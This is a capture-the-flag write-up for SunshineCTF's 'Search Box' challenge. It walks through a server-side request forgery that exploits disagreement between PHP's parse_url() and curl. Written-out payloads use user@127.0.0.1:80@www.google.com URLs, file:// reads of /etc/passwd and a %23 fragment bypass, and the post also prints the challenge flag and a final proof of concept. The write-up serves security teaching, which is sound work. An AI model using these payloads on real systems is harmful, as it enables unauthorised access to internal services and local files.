---
title: SunshineCTF - Search Box Writeup
layout: post
date: '2018-04-10 08:00:00'
description: Writeup of Search Box
image: https://i.imgur.com/ImCQbcQ.png
tags:
- ctf
- writeup
author: Guilherme "k33r0k" Assmann
---
### SunshineCtf - Search Box Writeup

>"This search engine doesn't look very secure. Or well coded. Or competent in any way shape or form. This should be easy.
>
>Note: flag is in /etc/flag.txt
>
>http://search-box.web1.sunshinectf.org"

There was an input field in the page enabling us to send a request to any URL we wanted

![](https://i.imgur.com/vltSBlC.png)

![](https://i.imgur.com/wpr4QMb.png)

After some tries I noticed that the only accepted URL was "www.google.com". Obviously one of the first ideas I had was to try getting files via `file://` URI scheme, which was unsuccessful.

![](https://i.imgur.com/ImCQbcQ.png)

Just when I was giving up on the `file://` idea, I tried putting together the wrapper and the accepted domain:

![](https://i.imgur.com/gpuZAAn.png)

`"get source failed"`, oops, so the wrapper actually worked, only it couldn't find the `www.google.com` in the directories, meaning we had a host filter, confirmed by requesting...:

![](https://i.imgur.com/MnYZ7CY.png)

PHP's `parse_url()` will be used here so we can draw our conclusions after some simple tests:

```
php > $url = "file://www.google.com"; 
php > var_dump(parse_url($url));
 array(2) { 
	["scheme"]=> string(4) "file" 
	["host"]=> string(14) "www.google.com" 
}
```

Considering that our host must always be `www.google.com`, we must find a way to make a request to an internal file or at least try reaching the localhost.

```
php > $url = "http://127.0.0.1@www.google.com"; 
php > var_dump(parse_url($url)); 
array(3) { 
	["scheme"]=> string(4) "http" 
	["host"]=> string(14) "www.google.com" 
	["user"]=> string(9) "127.0.0.1" 
}
```

In the output above we are passing `127.0.0.1` as user, but the URL will be correctly evaluated even though `curl` won't find a matching username:

![](https://i.imgur.com/Q3N9nUN.png)

If the response had "Source code" in it, either we are at `127.0.0.1` and the bypass was successful or we are at `www.google.com`. To test both situations we can try reaching an internal file that we are sure exists, like `index.php` in the webroot

![](https://i.imgur.com/mPBmx5f.png)

Aaaaaand... it failed.

After a quick research and some tests I ran into another bypass in which we inform the `user@127.0.0.1` credentials along with a destination port, with `www.google.com` still being the host. However curl does not accept the same parameters that  `parse_url()` does, so the `parse_url()` practically has no security useness in this code:

```
php > $url = "http://user@127.0.0.1:80@www.google.com/index.php";
php > var_dump(parse_url($url));
array(5) { 
	["scheme"]=> string(4) "http" 
	["host"]=> string(14) "www.google.com" 
	["user"]=> string(14) "user@127.0.0.1" 
	["pass"]=> string(2) "80" 
	["path"]=> string(10) "/index.php" 
}
```

I also made a local test with some code in `/var/www/html/x.php`

```
$ curl -v "http://user@127.0.0.1:80@www.google.com/x.php" 
* Trying 127.0.0.1... 
* Connected to 127.0.0.1 (127.0.0.1) port 80 (#0) 
* Server auth using Basic with user 'user' 
> GET /x.php HTTP/1.1 
> Host: 127.0.0.1 
> Authorization: Basic dXNlcjo= 
> User-Agent: curl/7.47.0 
> Accept: */* 
> 
< HTTP/1.1 200 OK 
< Date: Sat, 07 Apr 2018 00:47:05 GMT 
< Server: Apache/2.4.18 (Ubuntu) 
< Content-Length: 11 
< Content-Type: text/html; charset=UTF-8 
< 
TEST SSRF 
* Connection #0 to host 127.0.0.1 left intact
```

Then I tried it on the server:

![](https://i.imgur.com/PZmUHgj.png) 

![](https://i.imgur.com/nYUEobv.png) 

The task told us that we needed to get the flag in `/etc/flag.txt` but there was no way to use `file://` URI scheme because no file was being read. That seemed awkward to me.

![](https://i.imgur.com/xJWLbbN.png)

I noticed that the end of each requested file a `/` was being concatenated to the request. I tested it using curl and compared the results:

```
$ curl -v "file://user@127.0.0.1:80@www.google.com/etc/passwd" 

root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
``` 

VS: 

```
$ curl -v "file://user@127.0.0.1:80@www.google.com/etc/passwd/"
* Couldn't open file /etc/passwd/ 
* Closing connection -1 
curl: (37) Couldn't open file /etc/passwd/
```

Then I tried adding a `#` to delimit the URL and curl accepted it...

```
$ curl -v "file://user@127.0.0.1:80@www.google.com/etc/passwd#/"
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

but the application (using burp), didn't:

![](https://i.imgur.com/sn6lkYR.png)

So I took a more straightforward approach, using the `#` URL encoded representation `%23` and it worked:

![](https://i.imgur.com/W6BsOji.png)

![](https://i.imgur.com/BvHy36g.png)

Flag: `sun{R3quE5t_tyP3S_m4tT3r}`

Final PoC: `file://user@evil.com:80@www.google.com//var/www/html/index.php%23`
